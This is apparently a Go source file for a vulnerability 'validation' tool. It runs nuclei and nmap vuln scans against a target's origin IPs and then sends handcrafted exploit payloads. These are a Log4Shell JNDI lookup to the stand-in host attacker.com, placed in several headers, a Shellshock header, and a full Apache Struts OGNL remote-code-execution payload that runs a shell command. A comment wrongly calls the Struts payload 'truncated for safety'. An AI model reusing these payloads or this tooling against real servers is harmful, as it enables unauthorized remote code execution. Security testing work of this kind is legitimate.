package validation

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os/exec"
	"regexp"
	"strings"
	"sync"
	"time"
)

// CVEValidator validates CVE findings with real exploitation attempts
type CVEValidator struct {
	Target        string
	OriginIPs     []string
	Findings      []CVEFinding
	ValidatedCVEs []ValidatedCVE
	NucleiPath    string
	NmapPath      string
	Client        *http.Client
	mutex         sync.RWMutex
}

type CVEFinding struct {
	CVE         string  `json:"cve"`
	Service     string  `json:"service"`
	Version     string  `json:"version"`
	Port        int     `json:"port"`
	Confidence  float64 `json:"confidence"`
	Description string  `json:"description"`
	Source      string  `json:"source"`
}

type ValidatedCVE struct {
	CVE           string    `json:"cve"`
	Service       string    `json:"service"`
	Port          int       `json:"port"`
	Validated     bool      `json:"validated"`
	ExploitExists bool      `json:"exploit_exists"`
	CVSS          float64   `json:"cvss"`
	Severity      string    `json:"severity"`
	PoC           string    `json:"poc"`
	Evidence      string    `json:"evidence"`
	Timestamp     time.Time `json:"timestamp"`
	Method        string    `json:"method"`
}

type NucleiResult struct {
	TemplateID string `json:"template-id"`
	Info       struct {
		Name     string   `json:"name"`
		Severity string   `json:"severity"`
		Tags     []string `json:"tags"`
	} `json:"info"`
	Type     string `json:"type"`
	Host     string `json:"host"`
	Matched  string `json:"matched-at"`
	Evidence string `json:"extracted-results,omitempty"`
}

// NewCVEValidator creates new CVE validator
func NewCVEValidator(target string, originIPs []string) *CVEValidator {
	return &CVEValidator{
		Target:        target,
		OriginIPs:     originIPs,
		Findings:      make([]CVEFinding, 0),
		ValidatedCVEs: make([]ValidatedCVE, 0),
		NucleiPath:    "nuclei", // Assumes nuclei is in PATH
		NmapPath:      "nmap",   // Assumes nmap is in PATH
		Client: &http.Client{
			Timeout: 15 * time.Second,
		},
	}
}

// AddCVEFinding adds a CVE finding to be validated
func (v *CVEValidator) AddCVEFinding(cve, service, version string, port int, confidence float64, description, source string) {
	finding := CVEFinding{
		CVE:         cve,
		Service:     service,
		Version:     version,
		Port:        port,
		Confidence:  confidence,
		Description: description,
		Source:      source,
	}
	
	v.mutex.Lock()
	v.Findings = append(v.Findings, finding)
	v.mutex.Unlock()
}

// ValidateAllCVEs validates all CVE findings
func (v *CVEValidator) ValidateAllCVEs() error {
	fmt.Printf("🔍 Validating %d CVE findings against origin servers\n", len(v.Findings))
	
	// Step 1: Run Nuclei for automated validation
	fmt.Println("🧪 Step 1: Running Nuclei automated validation...")
	nucleiResults := v.runNucleiValidation()
	
	// Step 2: Run Nmap vulnerability scripts
	fmt.Println("🔍 Step 2: Running Nmap vulnerability validation...")
	nmapResults := v.runNmapVulnValidation()
	
	// Step 3: Manual exploitation attempts
	fmt.Println("⚡ Step 3: Manual exploitation validation...")
	manualResults := v.runManualValidation()
	
	// Combine all results
	v.mutex.Lock()
	v.ValidatedCVEs = append(v.ValidatedCVEs, nucleiResults...)
	v.ValidatedCVEs = append(v.ValidatedCVEs, nmapResults...)
	v.ValidatedCVEs = append(v.ValidatedCVEs, manualResults...)
	v.mutex.Unlock()
	
	return nil
}

// runNucleiValidation runs Nuclei templates for validation
func (v *CVEValidator) runNucleiValidation() []ValidatedCVE {
	var results []ValidatedCVE
	
	for _, ip := range v.OriginIPs {
		// Run Nuclei with CVE templates
		cmd := exec.Command(v.NucleiPath, 
			"-target", fmt.Sprintf("http://%s", ip),
			"-tags", "cve",
			"-json",
			"-silent",
			"-no-color",
		)
		
		output, err := cmd.Output()
		if err != nil {
			fmt.Printf("❌ Nuclei failed for %s: %v\n", ip, err)
			continue
		}
		
		// Parse Nuclei JSON output
		lines := strings.Split(string(output), "\n")
		for _, line := range lines {
			if strings.TrimSpace(line) == "" {
				continue
			}
			
			var nucleiResult NucleiResult
			if err := json.Unmarshal([]byte(line), &nucleiResult); err != nil {
				continue
			}
			
			// Extract CVE from template ID
			cve := v.extractCVEFromTemplate(nucleiResult.TemplateID)
			if cve == "" {
				continue
			}
			
			validated := ValidatedCVE{
				CVE:           cve,
				Service:       "unknown",
				Port:          80, // Default, could be extracted from host
				Validated:     true,
				ExploitExists: true,
				Severity:      nucleiResult.Info.Severity,
				PoC:           fmt.Sprintf("Nuclei template: %s", nucleiResult.TemplateID),
				Evidence:      nucleiResult.Evidence,
				Timestamp:     time.Now(),
				Method:        "nuclei_automated",
			}
			
			results = append(results, validated)
			fmt.Printf("✅ Nuclei validated: %s on %s\n", cve, ip)
		}
	}
	
	return results
}

// runNmapVulnValidation runs Nmap vulnerability scripts
func (v *CVEValidator) runNmapVulnValidation() []ValidatedCVE {
	var results []ValidatedCVE
	
	for _, ip := range v.OriginIPs {
		// Run Nmap with vulnerability scripts
		cmd := exec.Command(v.NmapPath,
			"-sV",
			"--script", "vuln",
			"--script-timeout", "300s",
			ip,
		)
		
		output, err := cmd.Output()
		if err != nil {
			fmt.Printf("❌ Nmap vuln scan failed for %s: %v\n", ip, err)
			continue
		}
		
		// Parse Nmap output for CVEs
		cves := v.parseNmapCVEs(string(output))
		for _, cve := range cves {
			validated := ValidatedCVE{
				CVE:           cve.CVE,
				Service:       cve.Service,
				Port:          cve.Port,
				Validated:     true,
				ExploitExists: false, // Nmap doesn't necessarily exploit
				Severity:      "unknown",
				PoC:           "Nmap vulnerability script detection",
				Evidence:      cve.Evidence,
				Timestamp:     time.Now(),
				Method:        "nmap_vuln_scripts",
			}
			
			results = append(results, validated)
			fmt.Printf("✅ Nmap detected: %s on %s:%d\n", cve.CVE, ip, cve.Port)
		}
	}
	
	return results
}

// runManualValidation performs manual exploitation attempts
func (v *CVEValidator) runManualValidation() []ValidatedCVE {
	var results []ValidatedCVE
	
	// Manual validation for common CVEs
	for _, finding := range v.Findings {
		for _, ip := range v.OriginIPs {
			validated := v.validateSpecificCVE(finding, ip)
			if validated.CVE != "" {
				results = append(results, validated)
			}
		}
	}
	
	return results
}

// validateSpecificCVE validates specific CVE with targeted tests
func (v *CVEValidator) validateSpecificCVE(finding CVEFinding, ip string) ValidatedCVE {
	switch {
	case strings.Contains(finding.CVE, "2021-44228"): // Log4Shell
		return v.validateLog4Shell(finding, ip)
	case strings.Contains(finding.CVE, "2014-6271"): // Shellshock
		return v.validateShellshock(finding, ip)
	case strings.Contains(finding.CVE, "2017-5638"): // Apache Struts
		return v.validateStrutsRCE(finding, ip)
	default:
		return v.validateGenericCVE(finding, ip)
	}
}

// validateLog4Shell tests for Log4Shell vulnerability
func (v *CVEValidator) validateLog4Shell(finding CVEFinding, ip string) ValidatedCVE {
	testURL := fmt.Sprintf("http://%s", ip)
	
	// Log4Shell LDAP payload
	payload := "${jndi:ldap://attacker.com/exploit}"
	
	req, err := http.NewRequest("GET", testURL, nil)
	if err != nil {
		return ValidatedCVE{}
	}
	
	// Test various headers
	headers := []string{"User-Agent", "X-Forwarded-For", "X-Real-IP", "Referer"}
	for _, header := range headers {
		req.Header.Set(header, payload)
	}
	
	resp, err := v.Client.Do(req)
	if err != nil {
		return ValidatedCVE{}
	}
	defer resp.Body.Close()
	
	// In real implementation, you'd check for DNS/HTTP callbacks
	// This is a simplified detection
	
	return ValidatedCVE{
		CVE:           finding.CVE,
		Service:       finding.Service,
		Port:          finding.Port,
		Validated:     false, // Would need actual callback verification
		ExploitExists: true,
		CVSS:          10.0,
		Severity:      "CRITICAL",
		PoC:           fmt.Sprintf("Log4Shell payload: %s", payload),
		Evidence:      "Payload sent, callback verification needed",
		Timestamp:     time.Now(),
		Method:        "manual_log4shell_test",
	}
}

// validateShellshock tests for Shellshock vulnerability
func (v *CVEValidator) validateShellshock(finding CVEFinding, ip string) ValidatedCVE {
	testURL := fmt.Sprintf("http://%s/cgi-bin/test.cgi", ip)
	
	payload := "() { :; }; echo vulnerable"
	
	req, err := http.NewRequest("GET", testURL, nil)
	if err != nil {
		return ValidatedCVE{}
	}
	
	req.Header.Set("User-Agent", payload)
	
	resp, err := v.Client.Do(req)
	if err != nil {
		return ValidatedCVE{}
	}
	defer resp.Body.Close()
	
	body := make([]byte, 1024)
	n, _ := resp.Body.Read(body)
	responseText := string(body[:n])
	
	validated := strings.Contains(responseText, "vulnerable")
	
	return ValidatedCVE{
		CVE:           finding.CVE,
		Service:       finding.Service,
		Port:          finding.Port,
		Validated:     validated,
		ExploitExists: validated,
		CVSS:          9.8,
		Severity:      "CRITICAL",
		PoC:           fmt.Sprintf("Shellshock payload: %s", payload),
		Evidence:      responseText,
		Timestamp:     time.Now(),
		Method:        "manual_shellshock_test",
	}
}

// validateStrutsRCE tests for Apache Struts RCE
func (v *CVEValidator) validateStrutsRCE(finding CVEFinding, ip string) ValidatedCVE {
	testURL := fmt.Sprintf("http://%s", ip)
	
	payload := "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo vulnerable').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
	
	req, err := http.NewRequest("POST", testURL, nil)
	if err != nil {
		return ValidatedCVE{}
	}
	
	req.Header.Set("Content-Type", payload)
	
	resp, err := v.Client.Do(req)
	if err != nil {
		return ValidatedCVE{}
	}
	defer resp.Body.Close()
	
	body := make([]byte, 1024)
	n, _ := resp.Body.Read(body)
	responseText := string(body[:n])
	
	validated := strings.Contains(responseText, "vulnerable")
	
	return ValidatedCVE{
		CVE:           finding.CVE,
		Service:       finding.Service,
		Port:          finding.Port,
		Validated:     validated,
		ExploitExists: validated,
		CVSS:          9.8,
		Severity:      "CRITICAL",
		PoC:           "Apache Struts RCE payload (truncated for safety)",
		Evidence:      responseText,
		Timestamp:     time.Now(),
		Method:        "manual_struts_rce_test",
	}
}

// validateGenericCVE performs generic validation
func (v *CVEValidator) validateGenericCVE(finding CVEFinding, ip string) ValidatedCVE {
	// Generic validation based on service and version
	return ValidatedCVE{
		CVE:           finding.CVE,
		Service:       finding.Service,
		Port:          finding.Port,
		Validated:     false,
		ExploitExists: false,
		Severity:      "unknown",
		PoC:           "Generic validation - manual verification required",
		Evidence:      fmt.Sprintf("Service: %s, Version: %s", finding.Service, finding.Version),
		Timestamp:     time.Now(),
		Method:        "generic_validation",
	}
}

// Helper functions
func (v *CVEValidator) extractCVEFromTemplate(templateID string) string {
	// Extract CVE from template ID (e.g., "cve-2021-44228" -> "CVE-2021-44228")
	re := regexp.MustCompile(`cve-(\d{4}-\d{4,})`)
	matches := re.FindStringSubmatch(templateID)
	if len(matches) > 1 {
		return fmt.Sprintf("CVE-%s", matches[1])
	}
	return ""
}

func (v *CVEValidator) parseNmapCVEs(output string) []struct {
	CVE      string
	Service  string
	Port     int
	Evidence string
} {
	var results []struct {
		CVE      string
		Service  string
		Port     int
		Evidence string
	}
	
	// Parse Nmap output for CVE references
	lines := strings.Split(output, "\n")
	for _, line := range lines {
		if strings.Contains(line, "CVE-") {
			re := regexp.MustCompile(`CVE-\d{4}-\d{4,}`)
			cves := re.FindAllString(line, -1)
			for _, cve := range cves {
				results = append(results, struct {
					CVE      string
					Service  string
					Port     int
					Evidence string
				}{
					CVE:      cve,
					Service:  "unknown",
					Port:     80,
					Evidence: line,
				})
			}
		}
	}
	
	return results
}

// GetValidatedCVEs returns all validated CVEs
func (v *CVEValidator) GetValidatedCVEs() []ValidatedCVE {
	v.mutex.RLock()
	defer v.mutex.RUnlock()
	
	return v.ValidatedCVEs
}

// GenerateReport creates detailed CVE validation report
func (v *CVEValidator) GenerateReport() string {
	report := fmt.Sprintf(`# 🧪 CVE VALIDATION REPORT

**Target:** %s
**Origin IPs Tested:** %d
**CVE Findings:** %d
**Validated CVEs:** %d
**Validation Time:** %s

`, v.Target, len(v.OriginIPs), len(v.Findings), len(v.ValidatedCVEs), time.Now().Format("2006-01-02 15:04:05"))

	if len(v.ValidatedCVEs) > 0 {
		report += "## 🚨 VALIDATED VULNERABILITIES\n\n"
		
		for i, cve := range v.ValidatedCVEs {
			status := "❌ Not Validated"
			if cve.Validated {
				status = "✅ Validated"
			}
			
			exploit := "❌ No Exploit"
			if cve.ExploitExists {
				exploit = "⚡ Exploit Available"
			}
			
			report += fmt.Sprintf(`### %d. %s

**Service:** %s  
**Port:** %d  
**Status:** %s  
**Exploit:** %s  
**Severity:** %s  
**CVSS:** %.1f  
**Method:** %s  

**Proof of Concept:**
%s

**Evidence:**
%s

---

`, i+1, cve.CVE, cve.Service, cve.Port, status, exploit, cve.Severity, cve.CVSS, cve.Method, cve.PoC, cve.Evidence)
		}
	} else {
		report += "## ✅ NO VALIDATED VULNERABILITIES\n\n"
		report += "While CVE findings were identified, none could be validated through exploitation.\n"
		report += "This suggests either false positives or proper security hardening.\n"
	}

	return report
}